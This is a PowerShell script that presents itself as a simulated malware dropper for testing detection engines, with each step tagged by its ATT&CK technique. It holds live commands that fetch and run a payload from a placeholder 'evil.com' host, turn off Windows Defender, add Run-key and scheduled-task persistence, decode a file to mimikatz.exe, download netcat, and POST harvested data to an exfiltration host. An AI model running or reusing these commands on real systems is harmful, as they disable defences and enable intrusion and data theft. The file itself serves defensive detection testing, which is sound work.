# Simulated malicious PowerShell dropper for UAT testing
# This file contains suspicious patterns that should trigger multiple detection engines

$encoded = [System.Convert]::FromBase64String("SW52b2tlLVdlYlJlcXVlc3Q=")
$decoded = [System.Text.Encoding]::UTF8.GetString($encoded)

# Download and execute pattern (T1059.001 + T1105)
$client = New-Object System.Net.WebClient
$payload = $client.DownloadString("http://malware-c2.evil.com/payload.exe")
Invoke-Expression $payload

# Encoded command execution
powershell.exe -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA==

# Registry persistence (T1547.001)
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate" -Value "C:\Users\Public\svchost.exe"

# Scheduled task persistence (T1053.005)
schtasks /create /tn "SystemHealthCheck" /tr "C:\Users\Public\svchost.exe" /sc onlogon /ru SYSTEM

# Disable Windows Defender (T1562.001)
Set-MpPreference -DisableRealtimeMonitoring $true
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f

# Credential access (certutil decode T1140)
certutil -decode C:\Users\Public\encoded.b64 C:\Users\Public\mimikatz.exe
certutil /decode C:\temp\payload.b64 C:\temp\loader.dll

# BITS transfer (T1197)
bitsadmin /transfer evil http://exfil.evil.com/tools/nc.exe C:\Users\Public\nc.exe

# WMI execution (T1047)
wmic process call create "cmd.exe /c whoami > C:\temp\info.txt"

# Network enumeration
net user /domain
net localgroup administrators

# Data exfiltration
Invoke-WebRequest -Uri "http://exfil.evil.com/upload" -Method POST -Body (Get-Content C:\temp\info.txt)
